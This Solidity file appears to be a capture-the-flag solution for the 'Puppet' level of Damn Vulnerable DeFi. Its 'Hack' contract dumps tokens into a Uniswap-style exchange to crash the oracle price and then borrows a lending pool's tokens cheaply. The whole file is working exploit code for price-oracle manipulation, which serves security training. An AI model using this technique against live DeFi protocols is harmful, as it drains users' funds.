// SPDX-License-Identifier: HACK
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";


contract Hack {


    constructor () {
    }

    function run(address _token, address _uniswapPairAddress, address _pool) public {
        oneRound(_token, _uniswapPairAddress, _pool, 50000*10**18);
        oneRound(_token, _uniswapPairAddress, _pool, 50000*10**18);

        
        (bool success, ) = address(_uniswapPairAddress).call{value: address(this).balance}(
            abi.encodeWithSignature(
                "ethToTokenSwapInput(uint256,uint256)",
                1,
                block.timestamp + 3
            )
        );
        require(success, "failed to swap DVTs for ETH");

        IERC20 token = IERC20(_token);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function oneRound(address _token, address _uniswapPairAddress, address _pool, uint256 _borrow) private {
        IERC20 token = IERC20(_token);

        uint256 tokenBalance = token.balanceOf(address(this));
        console.log("Token balance:", tokenBalance);

        bool success = token.approve(_uniswapPairAddress, tokenBalance);
        console.log("Allowance:", token.allowance(address(this), _uniswapPairAddress));

        console.log("Uniswap balance:", _uniswapPairAddress.balance);
        (success, ) = address(_uniswapPairAddress).call(
            abi.encodeWithSignature(
                "tokenToEthSwapInput(uint256,uint256,uint256)",
                tokenBalance,
                1,
                block.timestamp + 3
            )
        );
        require(success, "failed to swap DVTs for ETH");

        uint256 deposit = PuppetPool(_pool).calculateDepositRequired(_borrow);
        require(address(this).balance >= deposit, "Not enough ETH");

        console.log("Deposit required:", deposit);
        console.log("Contract's ETH balance:", address(this).balance);
        console.log("Borrowing:",_borrow);

        PuppetPool(_pool).borrow{value:deposit}(_borrow);

        console.log("Uniswap pair balance:", _uniswapPairAddress.balance);

        console.log('end of round');
    }

    receive() external payable {
        console.log("Received tokens from external payer");
    }
}
